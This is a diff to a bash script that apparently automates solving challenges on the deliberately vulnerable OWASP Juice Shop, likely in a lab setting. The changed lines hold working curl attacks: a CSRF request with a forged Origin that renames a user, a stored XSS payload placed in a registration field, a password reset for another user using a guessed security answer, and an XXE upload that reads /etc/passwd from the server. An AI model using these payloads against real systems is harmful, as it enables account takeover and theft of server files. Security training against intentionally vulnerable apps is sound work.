@@ -5,7 +5,7 @@ script=$(readlink -f $0)
 scriptpath=`dirname $script`
 
 # Define host IP ( the machine to attack ) and remote IP ( the machine which supports the attack )
-target_ip="10.10.77.180"
+target_ip="10.10.206.114"
 attack_ip="10.9.5.12"
 result_folder="/work/results/"
 
@@ -59,10 +59,11 @@ done
 
 # Change the name of a user by performing Cross-Site Request Forgery from another origin.
 echo "3.5 - CSRF"
-cp ${scriptpath}/csp-exploit.html $result_folder/3-csp-exploit.html
-sed -i "s/{IP}/${target_ip}/g" $result_folder/3-csp-exploit.html
-sed -i "s/{TOKEN}/${ADMIN_TOKEN}/g" $result_folder/3-csp-exploit.html
-sed -i "s/{ID}/${USER_ID}/g" $result_folder/3-csp-exploit.html
+curl -s -X POST http://$target_ip/profile -b "$result_folder/3-admin-cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://htmledit.squarefree.com" -H "Referer: http://htmledit.squarefree.com/" -L -d "username=mwahaha" 
+
+# Perform a persisted XSS attack with <iframe src="javascript:alert(`xss`)"> bypassing a client-side security mechanism. (This challenge is potentially harmful on Docker!)
+echo "3.6 - CLIENT-SIDE XSS PROTECTION"
+curl -s -X POST "http://$target_ip/api/Users/" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"<iframe src=\\\"javascript:alert(\`xss\`)\\\">\",\"password\":\"test123\",\"passwordRepeat\":\"test123\",\"securityQuestion\":{\"id\":2,\"question\":\"Mother's maiden name?\",\"createdAt\":\"2024-12-13T19:31:16.275Z\",\"updatedAt\":\"2024-12-13T19:31:16.275Z\"},\"securityAnswer\":\"test\"}" -o /dev/null
 
 # Exfiltrate the entire DB schema definition via SQL Injection.
 echo "3.7 - DATABASE SCHEMA"
@@ -125,7 +126,7 @@ JIM_TOKEN=$(jq -r '.authentication.token' $result_folder/3-jim.json)
 echo "--> Authenticated as jim with token $(echo "$JIM_TOKEN" | cut -c 1-20)...."
 cp $result_folder/3-cookies.txt $result_folder/3-jim-cookies.txt
 echo "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$JIM_TOKEN" >> $result_folder/3-jim-cookies.txt
-curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o $result_folder/3-jim.txt
+curl -s -X POST "http://$target_ip/rest/user/reset-password" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"test123\",\"repeat\":\"test123\"}" -o /dev/null
 curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/3-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"jim@juice-sh.op\",\"password\":\"test123\"}" -o $result_folder/3-jim.json
 
 # Put an additional product into another user's shopping basket.
@@ -175,7 +176,7 @@ curl -s -X POST "http://$target_ip/file-upload" -b "$result_folder/3-bjoern-cook
 
 # Retrieve the content of /etc/passwd from the server.
 echo "3.22 - XXE DATA ACCESS"
-curl -s -X POST "http://$target_ip/file-upload" -b "$result_folder/3-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -F "file=@$scriptpath/dangerous-invoice.xml;type=application/xml" -o /dev/null
+curl -s -X POST "http://$target_ip/file-upload" -b "$result_folder/3-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -F "file=@$scriptpath/dangerous-invoice.xml;type=application/xml" -o $result_folder/3-etc-passwd.html
 
 # Compute score
 echo "3.X - COMPUTE SCORE"
